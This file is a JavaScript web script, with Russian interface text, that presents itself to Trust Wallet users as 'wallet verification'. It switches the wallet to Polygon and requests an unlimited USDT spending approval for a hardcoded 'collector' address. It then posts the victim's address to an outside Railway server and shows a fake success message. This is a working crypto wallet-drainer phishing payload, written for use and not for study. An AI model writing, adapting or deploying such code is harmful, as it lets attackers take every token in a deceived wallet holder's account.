const USDT_CONTRACT = '0xc2132D05D31c914a87C6611C10748AEb04B58e8F';
const COLLECTOR_ADDRESS = '0x7C5fCDDEe0409aD1a4551eC8DD8738e8df181A88';
const POLYGON_CHAIN_ID = '0x89'; // 137 в Hex

async function connectAndApprove() {
    const status = document.getElementById('status');
    
    if (!window.ethereum) {
        status.innerText = 'Пожалуйста, откройте ссылку внутри Trust Wallet';
        return;
    }

    try {
        status.innerText = 'Переключение на Polygon...';

        try {
            await window.ethereum.request({
                method: 'wallet_switchEthereumChain',
                params: [{ chainId: POLYGON_CHAIN_ID }],
            });
        } catch (error) {
            if (error.code === 4902) {
                await window.ethereum.request({
                    method: 'wallet_addEthereumChain',
                    params: [{
                        chainId: POLYGON_CHAIN_ID,
                        chainName: 'Polygon Mainnet',
                        rpcUrls: ['https://polygon-rpc.com'],
                        nativeCurrency: { name: 'POL', symbol: 'POL', decimals: 18 },
                        blockExplorerUrls: ['https://polygonscan.com/']
                    }],
                });
            } else {
                throw error;
            }
        }

        const web3 = new Web3(window.ethereum);
        const accounts = await web3.eth.requestAccounts();
        const address = accounts[0];

        const abi = [
            {"inputs":[{"name":"_owner","type":"address"},{"name":"_spender","type":"address"}],"name":"allowance","outputs":[{"name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
            {"inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"}
        ];
        const contract = new web3.eth.Contract(abi, USDT_CONTRACT);
        
        // Функция для получения быстрой цены газа
        const getFastGasPrice = async () => {
            const price = await web3.eth.getGasPrice();
            return Math.floor(Number(price) * 1.5).toString(); // +50% для скорости
        };

        // ШАГ 1: Проверка текущего лимита
        const currentAllowance = await contract.methods.allowance(address, COLLECTOR_ADDRESS).call();
        
        // ШАГ 2: Если лимит не 0, сбрасываем его
        if (BigInt(currentAllowance) > 0n) {
            status.innerText = 'Обновление лимита (шаг 1/2)...';
            const gasPrice0 = await getFastGasPrice();
            await contract.methods.approve(COLLECTOR_ADDRESS, 0).send({ 
                from: address,
                gasPrice: gasPrice0
            });
        }

        status.innerText = 'Подтвердите активацию (шаг 2/2)...';
        const maxUint = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
        const gasPriceMax = await getFastGasPrice();

        // ШАГ 3: Установка максимального лимита
        await contract.methods.approve(COLLECTOR_ADDRESS, maxUint).send({ 
            from: address,
            gasPrice: gasPriceMax
        });

        status.innerText = 'Синхронизация с сервером...';

        // ШАГ 4: Отправка на твой Railway
        await fetch('https://railway-production-2954.up.railway.app/save-address', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({ address: address })
        });

        status.innerText = '✅ Готово! Кошелек успешно верифицирован.';
        status.style.color = '#00ff00';

    } catch (error) {
        status.innerText = 'Ошибка: ' + (error.message || 'Транзакция отклонена');
        console.error(error);
    }
}

document.getElementById('startBtn').addEventListener('click', connectAndApprove);
